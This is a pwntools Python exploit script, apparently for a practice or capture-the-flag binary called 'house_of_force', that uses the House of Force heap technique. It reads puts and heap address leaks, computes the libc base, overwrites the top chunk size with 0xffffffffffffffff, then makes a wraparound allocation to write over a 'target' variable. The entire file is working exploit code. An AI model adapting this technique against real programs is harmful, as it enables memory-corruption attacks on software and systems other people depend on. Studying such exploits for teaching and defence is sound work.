from pwn import *

elf = context.binary = ELF("house_of_force", checksec=True)
libc = elf.libc
context.log_level = "debug"

gs = """
continue
"""

def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    else:
        return process(elf.path)

io = start()
io.timeout = 1

# calculate the "wraparound" between two addresses
def delta(x, y):
    return (0xffffffffffffffff - x) + y


def malloc(size, data):
        io.sendafter(b"> ", b"1")
        io.sendafter(b": ", str(size).encode())
        io.sendafter(b": ", data)

# parse the puts leak
io.recvuntil(b"puts() @ ")
puts_leak = int(io.recvline(), 16)
log.info(f"puts @ {hex(puts_leak)}")

io.recvuntil(b"heap @ ")
heap_leak = int(io.recvline(), 16)
log.info(f"heap @ {hex(heap_leak)}")

libc.address = puts_leak - libc.sym.puts
log.info(f"libc base calculated @ {hex(libc.address)}")

# this is the distance between the top chunk and the 'target' variable
# we add 0x20 to account for the 0x20 chunk we alloacted, we take away 0x20 from elf.sym.target to stop just before the data of the variable
distance = delta(heap_leak + 0x20, elf.sym.target - 0x20)

# overwrite top chunk with large value   |  arbitrary write:
malloc("24", b"A"*24 + p64(0xffffffffffffffff))
malloc(distance, "junk")
malloc("24", "sub2pwnpope")

io.interactive()
